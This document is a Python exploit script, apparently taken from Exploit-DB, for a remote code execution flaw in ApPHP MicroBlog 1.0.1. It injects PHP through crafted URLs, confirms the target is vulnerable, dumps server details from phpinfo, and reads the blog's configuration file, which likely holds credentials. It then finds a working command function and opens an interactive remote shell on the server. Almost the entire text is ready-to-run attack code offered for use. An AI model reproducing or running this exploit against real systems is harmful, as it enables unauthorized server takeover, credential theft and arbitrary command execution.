#!/usr/bin/python
import random
import hashlib
import urllib.request, urllib.parse, urllib.error
from base64 import b64encode as b64
import sys
import re
import codecs

# Exploit Title: Python exploit for ApPHP MicroBlog 1.0.1 (Free Version) - RCE
# Exploit Author: LOTFREE
# Version: ApPHP MicroBlog 1.0.1 (Free Version)
# EDB-ID: 33030

print("  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-")
print("original exploit by Jiko : http://www.exploit-db.com/exploits/33030/")

if len(sys.argv) < 2:
    print("Usage: python {0} http://target/blog/index.php".format(sys.argv[0]))
    sys.exit()

debug = True
CHECK_FMT = "{0}?{1});echo(base64_decode({2})=/"
INFO_FMT = "{0}?{1});echo(base64_decode({2}));phpinfo();echo(base64_decode({3})=/"
# to read include/base.inc.php
CONFIG_FMT = "{0}?{1});echo(base64_decode({2}));readfile(base64_decode('aW5jbHVkZS9iYXNlLmluYy5waHA%3D'));echo(base64_decode({3})=/"
EXEC_FMT = "{0}?{1});echo(base64_decode({2}));{3}(base64_decode({4}));echo(base64_decode({5})=/"
index_url = sys.argv[1]

char = chr(random.randint(97,122))
start_mark = bytes(hashlib.md5(str.encode(str(random.random()))).hexdigest()[:15], 'utf-8')
end_mark = bytes(hashlib.md5(str.encode(str(random.random()))).hexdigest()[:15], 'utf-8')

print("[*] Testing for vulnerability...")
random_mark = hashlib.md5(str.encode(str(random.random()))).hexdigest()[:15]
url = CHECK_FMT.format(index_url, char, b64(bytes(random_mark,'utf-8')))
if debug:
    print(url)
r = urllib.request.urlopen(url)
if not random_mark in codecs.decode(r.read()):
    print("[-] Website is not vulnerable :'(")
    sys.exit()

print("[+] Website is vulnerable")
print()

def extract_between(data):
    global start_mark
    global end_mark

    if start_mark not in data or end_mark not in data:
        print("[-] Oops. Something went wrong :(")
        return ""

    return data.split(start_mark, 1)[1].split(end_mark, 1)[0]

print("[*] Fecthing phpinfo")
url = INFO_FMT.format(index_url, char, b64(start_mark), b64(end_mark))
if debug:
    print(url)
r = urllib.request.urlopen(url)
output = codecs.decode(extract_between(r.read()))
output = re.compile(r'<[^<]*?/?>').sub(' ', output)

interesting_values = [
    "PHP Version",
    "System",
    "Loaded Configuration File",
    "Apache Version",
    "Server Root",
    "DOCUMENT_ROOT",
    "allow_url_",
    "disable_functions",
    "open_basedir",
    "safe_mode",
    "User/Group"]

for line in output.split("\n"):
    line = line.strip()
    if line:
        for value in interesting_values:
            if line.startswith(value):
                print("\t" + line)
print()

print("[*] Fetching include/base.inc.php")
url = CONFIG_FMT.format(index_url, char, b64(start_mark), b64(end_mark))
if debug:
    print(url)
r = urllib.request.urlopen(url)
output = codecs.decode(extract_between(r.read()))
print(output)
print()

exec_functions = ["system", "passthru", "exec", "shell_exec"]
valid_exec = None
print("[*] Testing remote execution")
for func in exec_functions:
    # trying to exec "echo LOTFREE"
    url = EXEC_FMT.format(index_url, char, b64(start_mark), func, "ZWNobyBMT1RGUkVF", b64(end_mark))
    if debug:
        print(url)
    r = urllib.request.urlopen(url)
    output = codecs.decode(extract_between(r.read()))
    if "LOTFREE" in output:
        valid_exec = func
        break

if valid_exec is None:
    print("[-] Did not manage to execute commands :(")
    sys.exit()

print("[+] Remote exec is working with {0}() :)".format(valid_exec))
print("Submit your commands, type exit to quit")
while True:
    try:
        cmd = bytes(input("> ").strip(), 'utf-8')
    except EOFError:
        print()
        break
    if cmd == b'exit':
        print()
        break
    if (len(cmd) % 3) > 0:
        padding = b' ' * (3 - len(cmd) % 3)
        cmd = cmd + padding
    print('cmd: ' + str(type(cmd)) + "  start: " + str(type(start_mark)) + "  end: " + str(type(end_mark)))
    url = EXEC_FMT.format(index_url, char, b64(start_mark), func, b64(cmd), b64(end_mark))
    if debug:
        print(url)
    r = urllib.request.urlopen(url)
    output = (extract_between(r.read()))
    print(output)
    print()
